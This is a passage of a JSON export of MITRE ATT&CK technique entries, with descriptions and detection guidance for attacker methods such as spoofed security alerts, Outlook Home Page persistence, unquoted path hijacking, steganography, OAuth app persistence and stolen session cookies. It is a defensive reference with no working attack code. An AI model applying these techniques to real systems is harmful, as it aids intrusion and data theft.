      "url": "https://attack.mitre.org/techniques/T1667",
      "stix_id": "attack-pattern--bed81616-3dde-4685-be6e-ba9820f9a7ed",
      "created": "2025-01-31T14:39:58.478000+00:00",
      "modified": "2025-04-15T19:59:03.350000+00:00",
      "platforms": [
        "Linux",
        "Office Suite",
        "Windows",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Application Log: Application Log Content",
        "Network Traffic: Network Traffic Flow",
        "File: File Creation"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1562.011": {
      "id": "T1562.011",
      "name": "Spoof Security Alerting",
      "description": "Adversaries may spoof security alerting from tools, presenting false evidence to impair defenders\u2019 awareness of malicious activity.(Citation: BlackBasta) Messages produced by defensive tools contain information about potential security events as well as the functioning status of security software and the system. Security reporting messages are important for monitoring the normal operation of a system and identifying important events that can signal a security incident.\n\nRather than or in addition to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), an adversary can spoof positive affirmations that security tools are continuing to function even after legitimate security tools have been disabled (e.g., [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)). An adversary can also present a \u201chealthy\u201d system status even after infection. This can be abused to enable further malicious activity by delaying defender responses.\n\nFor example, adversaries may show a fake Windows Security GUI and tray icon with a \u201chealthy\u201d system status after Windows Defender and other system tools have been disabled.(Citation: BlackBasta)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1562.011",
      "stix_id": "attack-pattern--bef8aaee-961d-4359-a308-4c2182bcedff",
      "created": "2023-03-14T16:04:24.865000+00:00",
      "modified": "2025-04-15T23:12:05.813000+00:00",
      "platforms": [
        "Windows",
        "macOS",
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Sensor Health: Host Status"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1137.004": {
      "id": "T1137.004",
      "name": "Outlook Home Page",
      "description": "Adversaries may abuse Microsoft Outlook's Home Page feature to obtain persistence on a compromised system. Outlook Home Page is a legacy feature used to customize the presentation of Outlook folders. This feature allows for an internal or external URL to be loaded and presented whenever a folder is opened. A malicious HTML page can be crafted that will execute code when loaded by Outlook Home Page.(Citation: SensePost Outlook Home Page)\n\nOnce malicious home pages have been added to the user\u2019s mailbox, they will be loaded when Outlook is started. Malicious Home Pages will execute when the right Outlook folder is loaded/reloaded.(Citation: SensePost Outlook Home Page)\n",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1137.004",
      "stix_id": "attack-pattern--bf147104-abf9-4221-95d1-e81585859441",
      "created": "2019-11-07T20:09:56.536000+00:00",
      "modified": "2025-04-15T22:55:34.415000+00:00",
      "platforms": [
        "Windows",
        "Office Suite"
      ],
      "permissions_required": [],
      "data_sources": [
        "Application Log: Application Log Content",
        "Command: Command Execution",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "Microsoft has released a PowerShell script to safely gather mail forwarding rules and custom forms in your mail environment as well as steps to interpret the output.(Citation: Microsoft Detect Outlook Forms) SensePost, whose tool [Ruler](https://attack.mitre.org/software/S0358) can be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage.(Citation: SensePost NotRuler)\n\nCollect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior."
    },
    "T1573.002": {
      "id": "T1573.002",
      "name": "Asymmetric Cryptography",
      "description": "Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiver\u2019s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.\n\nFor efficiency, many protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002).",
      "tactic": "command-and-control",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1573.002",
      "stix_id": "attack-pattern--bf176076-b789-408e-8cba-7275e81c0ada",
      "created": "2020-03-16T15:48:33.882000+00:00",
      "modified": "2025-04-15T19:59:03.664000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "Network Devices",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Content"
      ],
      "defense_bypassed": [],
      "detection": "SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.(Citation: SANS Decrypting SSL) SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.(Citation: SEI SSL Inspection Risks)\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)"
    },
    "T1567.002": {
      "id": "T1567.002",
      "name": "Exfiltration to Cloud Storage",
      "description": "Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.\n\nExamples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service. ",
      "tactic": "exfiltration",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1567.002",
      "stix_id": "attack-pattern--bf1b6176-597c-4600-bfcd-ac989670f96b",
      "created": "2020-03-09T15:04:32.767000+00:00",
      "modified": "2025-04-15T19:59:03.751000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Content",
        "Network Traffic: Network Connection Creation",
        "Network Traffic: Network Traffic Flow",
        "File: File Access",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server) to known cloud storage services. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. User behavior monitoring may help to detect abnormal patterns of activity."
    },
    "T1570": {
      "id": "T1570",
      "name": "Lateral Tool Transfer",
      "description": "Adversaries may transfer tools or other files between systems in a compromised environment. Once brought into the victim environment (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) files may then be copied from one system to another to stage adversary tools or other files over the course of an operation.\n\nAdversaries may copy files between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) to connected network shares or with authenticated connections via [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001).(Citation: Unit42 LockerGoga 2019)\n\nFiles can also be transferred using native or otherwise present tools on the victim system, such as scp, rsync, curl, sftp, and [ftp](https://attack.mitre.org/software/S0095). In some cases, adversaries may be able to leverage [Web Service](https://attack.mitre.org/techniques/T1102)s such as Dropbox or OneDrive to copy files from one machine to another via shared, automatically synced folders.(Citation: Dropbox Malware Sync)",
      "tactic": "lateral-movement",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1570",
      "stix_id": "attack-pattern--bf90d72c-c00b-45e3-b3aa-68560560d4c5",
      "created": "2020-03-11T21:01:00.959000+00:00",
      "modified": "2025-04-15T19:59:03.832000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Named Pipe: Named Pipe Metadata",
        "Network Share: Network Share Access",
        "Network Traffic: Network Traffic Flow",
        "Command: Command Execution",
        "Process: Process Creation",
        "File: File Creation",
        "Network Traffic: Network Traffic Content",
        "File: File Metadata"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for file creation and files transferred within a network using protocols such as SMB or FTP. Unusual processes with internal network connections creating files on-system may be suspicious. Consider monitoring for abnormal usage of utilities and command-line arguments that may be used in support of remote transfer of files. Considering monitoring for alike file hashes or characteristics (ex: filename) that are created on multiple hosts."
    },
    "T1574.009": {
      "id": "T1574.009",
      "name": "Path Interception by Unquoted Path",
      "description": "Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.\n\nService paths (Citation: Microsoft CurrentControlSet Services) and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., <code>C:\\unsafe path with space\\program.exe</code> vs. <code>\"C:\\safe path with space\\program.exe\"</code>). (Citation: Help eliminate unquoted path) (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is <code>C:\\program files\\myapp.exe</code>, an adversary may create a program at <code>C:\\program.exe</code> that will be run instead of the intended program. (Citation: Windows Unquoted Services) (Citation: Windows Privilege Escalation Guide)\n\nThis technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1574.009",
      "stix_id": "attack-pattern--bf96a5a3-3bce-43b7-8597-88545984c07b",
      "created": "2020-03-13T13:51:58.519000+00:00",
      "modified": "2025-04-15T22:56:46.356000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Modification",
        "File: File Creation",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as \"findstr,\" \"net,\" and \"python\"). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious.\n\nData and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement."
    },
    "T1608.003": {
      "id": "T1608.003",
      "name": "Install Digital Certificate",
      "description": "Adversaries may install SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are files that can be installed on servers to enable secure communications between systems. Digital certificates include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate securely with its owner. Certificates can be uploaded to a server, then the server can be configured to use the certificate to enable encrypted communication with it.(Citation: DigiCert Install SSL Cert)\n\nAdversaries may install SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or lending credibility to a credential harvesting site. Installation of digital certificates may take place for a number of server types, including web servers and email servers. \n\nAdversaries can obtain digital certificates (see [Digital Certificates](https://attack.mitre.org/techniques/T1588/004)) or create self-signed certificates (see [Digital Certificates](https://attack.mitre.org/techniques/T1587/003)). Digital certificates can then be installed on adversary controlled infrastructure that may have been acquired ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or previously compromised ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1608.003",
      "stix_id": "attack-pattern--c071d8c1-3b3a-4f22-9407-ca4e96921069",
      "created": "2021-03-17T20:32:13.793000+00:00",
      "modified": "2025-04-15T22:42:10.891000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Internet Scan: Response Content"
      ],
      "defense_bypassed": [],
      "detection": "Consider use of services that may aid in the tracking of certificates in use on sites across the Internet. In some cases it may be possible to pivot on known pieces of certificate information to uncover other adversary infrastructure.(Citation: Splunk Kovar Certificates 2017)\n\nDetection efforts may be focused on related behaviors, such as [Web Protocols](https://attack.mitre.org/techniques/T1071/001) or [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002)."
    },
    "T1037.005": {
      "id": "T1037.005",
      "name": "Startup Items",
      "description": "Adversaries may use startup items automatically executed at boot initialization to establish persistence. Startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items.(Citation: Startup Items)\n\nThis is technically a deprecated technology (superseded by [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)), and thus the appropriate folder, <code>/Library/StartupItems</code> isn\u2019t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra. A startup item is a directory whose executable and configuration property list (plist), <code>StartupParameters.plist</code>, reside in the top-level directory. \n\nAn adversary can create the appropriate folders/files in the StartupItems directory to register their own persistence mechanism.(Citation: Methods of Mac Malware Persistence) Additionally, since StartupItems run during the bootup phase of macOS, they will run as the elevated root user.",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1037.005",
      "stix_id": "attack-pattern--c0dfe7b0-b873-4618-9ff8-53e31f70907f",
      "created": "2020-01-15T18:00:33.603000+00:00",
      "modified": "2025-04-16T20:37:20.168000+00:00",
      "platforms": [
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "File: File Creation",
        "Process: Process Creation",
        "File: File Modification"
      ],
      "defense_bypassed": [],
      "detection": "The <code>/Library/StartupItems</code> folder can be monitored for changes. Similarly, the programs that are actually executed from this mechanism should be checked against a whitelist.\n\nMonitor processes that are executed during the bootup process to check for unusual or unknown applications and behavior."
    },
    "T1614.001": {
      "id": "T1614.001",
      "name": "System Language Discovery",
      "description": "Adversaries may attempt to gather information about the system language of a victim in order to infer the geographical location of that host. This information may be used to shape follow-on behaviors, including whether the adversary infects the target and/or attempts specific actions. This decision may be employed by malware developers and operators to reduce their risk of attracting the attention of specific law enforcement agencies or prosecution/scrutiny from other entities.(Citation: Malware System Language Check)\n\nThere are various sources of data an adversary could use to infer system language, such as system defaults and keyboard layouts. Specific checks will vary based on the target and/or adversary, but may involve behaviors such as [Query Registry](https://attack.mitre.org/techniques/T1012) and calls to [Native API](https://attack.mitre.org/techniques/T1106) functions.(Citation: CrowdStrike Ryuk January 2019) \n\nFor example, on a Windows system adversaries may attempt to infer the language of a system by querying the registry key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language</code> or parsing the outputs of Windows API functions <code>GetUserDefaultUILanguage</code>, <code>GetSystemDefaultUILanguage</code>, <code>GetKeyboardLayoutList</code> and <code>GetUserDefaultLangID</code>.(Citation: Darkside Ransomware Cybereason)(Citation: Securelist JSWorm)(Citation: SecureList SynAck Doppelg\u00e4nging May 2018)\n\nOn a macOS or Linux system, adversaries may query <code>locale</code> to retrieve the value of the <code>$LANG</code> environment variable.",
      "tactic": "discovery",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1614.001",
      "stix_id": "attack-pattern--c1b68a96-3c48-49ea-a6c0-9b27359f9c19",
      "created": "2021-08-18T14:06:45.244000+00:00",
      "modified": "2025-04-25T14:47:55.750000+00:00",
      "platforms": [
        "Windows",
        "Linux",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Process: OS API Execution",
        "Windows Registry: Windows Registry Key Access",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system language information. This may include calls to various API functions and interaction with system configuration settings such as the Windows Registry."
    },
    "T1095": {
      "id": "T1095",
      "name": "Non-Application Layer Protocol",
      "description": "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive.(Citation: Wikipedia OSI) Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example.(Citation: Cisco Synful Knock Evolution) Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts.(Citation: Microsoft ICMP) However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.\n\nIn ESXi environments, adversaries may leverage the Virtual Machine Communication Interface (VMCI) for communication between guest virtual machines and the ESXi host. This traffic is similar to client-server communications on traditional network sockets but is localized to the physical machine running the ESXi host, meaning it does not traverse external networks (routers, switches). This results in communications that are invisible to external monitoring and standard networking tools like tcpdump, netstat, nmap, and Wireshark. By adding a VMCI backdoor to a compromised ESXi host, adversaries may persistently regain access from any guest VM to the compromised ESXi host\u2019s backdoor, regardless of network segmentation or firewall rules in place.(Citation: Google Cloud Threat Intelligence VMWare ESXi Zero-Day 2023)",
      "tactic": "command-and-control",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1095",
      "stix_id": "attack-pattern--c21d5a77-d422-4a69-acd7-2c53c1faa34b",
      "created": "2017-05-31T21:31:10.728000+00:00",
      "modified": "2025-04-15T19:59:04.779000+00:00",
      "platforms": [
        "Windows",
        "Linux",
        "macOS",
        "Network Devices",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Content",
        "Network Traffic: Network Traffic Flow"
      ],
      "defense_bypassed": [],
      "detection": "Analyze network traffic for ICMP messages or other protocols that contain abnormal data or are not normally seen within or exiting the network.(Citation: Cisco Blog Legacy Device Attacks)\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2) \n\nMonitor and investigate API calls to functions associated with enabling and/or utilizing alternative communication channels."
    },
    "T1027.003": {
      "id": "T1027.003",
      "name": "Steganography",
      "description": "Adversaries may use steganography techniques in order to prevent the detection of hidden information. Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files.\n\n[Duqu](https://attack.mitre.org/software/S0038) was an early example of malware that used steganography. It encrypted the gathered information from a victim's system and hid it within an image before exfiltrating the image to a C2 server.(Citation: Wikipedia Duqu) \n\nBy the end of 2017, a threat group used\u202f<code>Invoke-PSImage</code>\u202fto hide [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands in an image file (.png) and execute the code on a victim's system. In this particular case the [PowerShell](https://attack.mitre.org/techniques/T1059/001) code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary.(Citation: McAfee Malicious Doc Targets Pyeongchang Olympics)  ",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1027.003",
      "stix_id": "attack-pattern--c2e147a9-d1a8-4074-811a-d8789202d916",
      "created": "2020-02-05T14:28:16.719000+00:00",
      "modified": "2025-04-15T23:13:05.893000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Metadata"
      ],
      "defense_bypassed": [],
      "detection": "Detection of steganography is difficult unless artifacts are left behind by the obfuscation process that are detectable with a known signature. Look for strings or other signatures left in system artifacts related to decoding steganography."
    },
    "T1584.002": {
      "id": "T1584.002",
      "name": "DNS Server",
      "description": "Adversaries may compromise third-party DNS servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: [Application Layer Protocol](https://attack.mitre.org/techniques/T1071)). Instead of setting up their own DNS servers, adversaries may compromise third-party DNS servers in support of operations.\n\nBy compromising DNS servers, adversaries can alter DNS records. Such control can allow for redirection of an organization's traffic, facilitating Collection and Credential Access efforts for the adversary.(Citation: Talos DNSpionage Nov 2018)(Citation: FireEye DNS Hijack 2019)  Additionally, adversaries may leverage such control in conjunction with [Digital Certificates](https://attack.mitre.org/techniques/T1588/004) to redirect traffic to adversary-controlled infrastructure, mimicking normal trusted network communications.(Citation: FireEye DNS Hijack 2019)(Citation: Crowdstrike DNS Hijack 2019) Adversaries may also be able to silently create subdomains pointed at malicious servers without tipping off the actual owner of the DNS server.(Citation: CiscoAngler)(Citation: Proofpoint Domain Shadowing)",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1584.002",
      "stix_id": "attack-pattern--c2f59d25-87fe-44aa-8f83-e8e59d077bf5",
      "created": "2020-10-01T00:54:30.869000+00:00",
      "modified": "2025-04-15T22:13:56.342000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Domain Name: Active DNS",
        "Domain Name: Passive DNS"
      ],
      "defense_bypassed": [],
      "detection": "Consider monitoring for anomalous resolution changes for domain addresses. Efforts may need to be tailored to specific domains of interest as benign resolution changes are a common occurrence on the internet.\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control."
    },
    "T1671": {
      "id": "T1671",
      "name": "Cloud Application Integration",
      "description": "Adversaries may achieve persistence by leveraging OAuth application integrations in a software-as-a-service environment. Adversaries may create a custom application, add a legitimate application into the environment, or even co-opt an existing integration to achieve malicious ends.(Citation: Push Security SaaS Persistence 2022)(Citation: SaaS Attacks GitHub Evil Twin Integrations)\n\nOAuth is an open standard that allows users to authorize applications to access their information on their behalf. In a SaaS environment such as Microsoft 365 or Google Workspace, users may integrate applications to improve their workflow and achieve tasks.  \n\nLeveraging application integrations may allow adversaries to persist in an environment \u2013 for example, by granting consent to an application from a high-privileged adversary-controlled account in order to maintain access to its data, even in the event of losing access to the account.(Citation: Wiz Midnight Blizzard 2024)(Citation: Microsoft Malicious OAuth Applications 2022)(Citation: Huntress Persistence Microsoft 365 Compromise 2024) In some cases, integrations may remain valid even after the original consenting user account is disabled.(Citation: Push Security Slack Persistence 2023) Application integrations may also allow adversaries to bypass multi-factor authentication requirements through the use of [Application Access Token](https://attack.mitre.org/techniques/T1550/001)s. Finally, they may enable persistent [Automated Exfiltration](https://attack.mitre.org/techniques/T1020) over time.(Citation: Synes Cyber Corner Malicious Azure Application 2023)\n\nCreating or adding a new application may require the adversary to create a dedicated [Cloud Account](https://attack.mitre.org/techniques/T1136/003) for the application and assign it [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) \u2013 for example, in Microsoft 365 environments, an application can only access resources via an associated service principal.(Citation: Microsoft Entra ID Service Principals)  ",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1671",
      "stix_id": "attack-pattern--c31aebd6-c9b5-420f-ba2a-5853bbf897fa",
      "created": "2025-03-20T22:21:59.326000+00:00",
      "modified": "2025-04-15T19:59:05.283000+00:00",
      "platforms": [
        "SaaS",
        "Office Suite"
      ],
      "permissions_required": [],
      "data_sources": [
        "Active Directory: Active Directory Object Modification",
        "Cloud Service: Cloud Service Modification"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1001.003": {
      "id": "T1001.003",
      "name": "Protocol or Service Impersonation",
      "description": "Adversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts. By impersonating legitimate protocols or web services, adversaries can make their command and control traffic blend in with legitimate network traffic.  \n\nAdversaries may impersonate a fake SSL/TLS handshake to make it look like subsequent traffic is SSL/TLS encrypted, potentially interfering with some security tooling, or to make the traffic look like it is related with a trusted entity. \n\nAdversaries may also leverage legitimate protocols to impersonate expected web traffic or trusted services. For example, adversaries may manipulate HTTP headers, URI endpoints, SSL certificates, and transmitted data to disguise C2 communications or mimic legitimate services such as Gmail, Google Drive, and Yahoo Messenger.(Citation: ESET Okrum July 2019)(Citation: Malleable-C2-U42)",
      "tactic": "command-and-control",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1001.003",
      "stix_id": "attack-pattern--c325b232-d5bc-4dde-a3ec-71f3db9e8adc",
      "created": "2020-03-15T00:40:27.503000+00:00",
      "modified": "2025-04-15T19:59:05.377000+00:00",
      "platforms": [
        "Linux",
        "Windows",
        "macOS",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Content"
      ],
      "defense_bypassed": [],
      "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)"
    },
    "T1012": {
      "id": "T1012",
      "name": "Query Registry",
      "description": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\n\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security.(Citation: Wikipedia Windows Registry) Information can easily be queried using the [Reg](https://attack.mitre.org/software/S0075) utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from [Query Registry](https://attack.mitre.org/techniques/T1012) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
      "tactic": "discovery",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1012",
      "stix_id": "attack-pattern--c32f7008-9fea-41f7-8366-5eb9b74bd896",
      "created": "2017-05-31T21:30:25.584000+00:00",
      "modified": "2025-04-15T22:58:50.612000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: OS API Execution",
        "Windows Registry: Windows Registry Key Access",
        "Command: Command Execution",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nInteraction with the Windows Registry may come from the command line using utilities such as [Reg](https://attack.mitre.org/software/S0075) or through running malware that may interact with the Registry through an API. Command-line invocation of utilities used to query the Registry may be detected through process and command-line monitoring. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001)."
    },
    "T1030": {
      "id": "T1030",
      "name": "Data Transfer Size Limits",
      "description": "An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.",
      "tactic": "exfiltration",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1030",
      "stix_id": "attack-pattern--c3888c54-775d-4b2f-b759-75a2ececcbfd",
      "created": "2017-05-31T21:30:34.523000+00:00",
      "modified": "2025-04-15T19:59:05.559000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Connection Creation",
        "Network Traffic: Network Traffic Flow"
      ],
      "defense_bypassed": [],
      "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). If a process maintains a long connection during which it consistently sends fixed size data packets or a process opens connections and sends fixed sized data packets at regular intervals, it may be performing an aggregate data transfer. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)"
    },
    "T1550.004": {
      "id": "T1550.004",
      "name": "Web Session Cookie",
      "description": "Adversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated.(Citation: Pass The Cookie)\n\nAuthentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently. Cookies are often valid for an extended period of time, even if the web application is not actively used. After the cookie is obtained through [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539) or [Web Cookies](https://attack.mitre.org/techniques/T1606/001), the adversary may then import the cookie into a browser they control and is then able to use the site or application as the user for as long as the session cookie is active. Once logged into the site, an adversary can access sensitive information, read email, or perform actions that the victim account has permissions to perform.\n\nThere have been examples of malware targeting session cookies to bypass multi-factor authentication systems.(Citation: Unit 42 Mac Crypto Cookies January 2019)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1550.004",
      "stix_id": "attack-pattern--c3c8c916-2f3c-4e71-94b2-240bdfc996f0",
      "created": "2020-01-30T17:48:49.395000+00:00",
      "modified": "2025-04-15T19:59:05.730000+00:00",
      "platforms": [
        "SaaS",
        "IaaS",
        "Office Suite"
      ],
      "permissions_required": [],
      "data_sources": [
        "Application Log: Application Log Content",
        "Web Credential: Web Credential Usage"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for anomalous access of websites and cloud-based applications by the same user in different locations or by different systems that do not match expected configurations."
    },
    "T1078.002": {
      "id": "T1078.002",
      "name": "Domain Accounts",
      "description": "Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.(Citation: TechNet Credential Theft) Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.(Citation: Microsoft AD Accounts)\n\nAdversaries may compromise domain accounts, some with a high level of privileges, through various means such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) or password reuse, allowing access to privileged resources of the domain.",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1078.002",
      "stix_id": "attack-pattern--c3d4bdd9-2cfe-4a80-9d0c-07a29ecdce8f",
      "created": "2020-03-13T20:21:54.758000+00:00",
      "modified": "2025-04-16T20:37:20.358000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "ESXi"
      ],
